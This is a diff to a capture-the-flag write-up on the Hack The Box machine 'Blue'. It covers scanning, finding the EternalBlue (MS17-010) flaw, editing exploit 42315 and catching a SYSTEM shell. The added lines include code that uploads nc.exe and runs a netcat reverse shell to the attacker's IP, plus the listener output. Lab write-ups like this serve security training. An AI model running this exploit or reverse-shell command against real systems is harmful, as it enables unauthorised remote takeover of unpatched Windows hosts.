@@ -28,7 +28,7 @@ PORT      STATE SERVICE      VERSION
 49156/tcp open  msrpc        Microsoft Windows RPC
 49157/tcp open  msrpc        Microsoft Windows RPC
 ```
-From this we can see that the ports of most interest are 135,139,445. Before attempting to scan shares that maybe accessible anonymously a quick vulnerability scan shows that the server is vulnerable to EternalBlue. With the box being named Blue it is safe to assume this is a sensible attack vector.
+From this we can see that the ports of most interest are 135,139,445. Before attempting to scan shares that might be accessible anonymously a quick vulnerability scan shows that the server is vulnerable to MS17-010, otherwise known as EternalBlue. With the box being named Blue it is safe to assume this is a sensible attack vector.
 ```
 ┌──[10.10.14.27]-(calxus㉿calxus)-[~]
 └─$ sudo nmap -p139,445 --script vuln 10.129.112.225                                                                                                                                                                                   130 ⨯
@@ -60,6 +60,7 @@ Host script results:
 ```
 Having identified a route forward lets move on to the exploitation phase.
 ## Foothold
+Search on exploitdb for an exploit for this vulnerability we find three to choose from.
 ```
 ┌──[10.10.14.27]-(calxus㉿calxus)-[~]
 └─$ searchsploit eternalblue
@@ -71,4 +72,44 @@ Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue'  | windows/remot
 Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote | windows_x86-64/remote/42030.py
 ----------------------------------------------------------------- --------------------------------
 ```
+I chose to go with 42315, however it was written in Python 2.7 so to run this on my Kali instance with the least trouble I chose to use a docker container to run it inside.
+```
+┌──[10.10.14.27]-(calxus㉿calxus)-[~]
+└─$ sudo docker run -it -v "$(pwd)"/hackthebox/blue:/blue --entrypoint /bin/bash python:2.7.18-stretch
+root@79a4e2b0be9a:/# pip install impacket
+```
+The exploit needs a couple of edits in order to produce a shell. First of all the username needs to be provided which in this case would be "anonymous". Secondly we need to edit the lines in the function "smb_pwn" to execute a reverse shell.
+```python
+#       print('creating file c:\\pwned.txt on the target')
+#       tid2 = smbConn.connectTree('C$')
+#       fid2 = smbConn.createFile(tid2, '/pwned.txt')
+#       smbConn.closeFile(tid2, fid2)
+#       smbConn.disconnectTree(tid2)
+
+        smb_send_file(smbConn, 'nc.exe', 'C', '/nc.exe')
+        service_exec(conn, r'cmd /c c:\nc.exe -nv 10.10.14.27 2121 -e cmd.exe')
+```
+After running this exploit using the following command our netcat listener should receive a shell if it is listening on the same port
+```
+root@79a4e2b0be9a:/blue# python blue.py 10.129.112.225
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Using named pipe: samr
+Target is 64 bit
+Got frag size: 0x10
+...
+Creating service ANJU.....
+Starting service ANJU.....
+```
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/blue]
+└─$ nc -nlvp 2121
+listening on [any] 2121 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.112.225] 49159
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Administrator\Desktop>whoami
+whoami
+nt authority\system
+```
 ## Privilege Escalation
+As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation
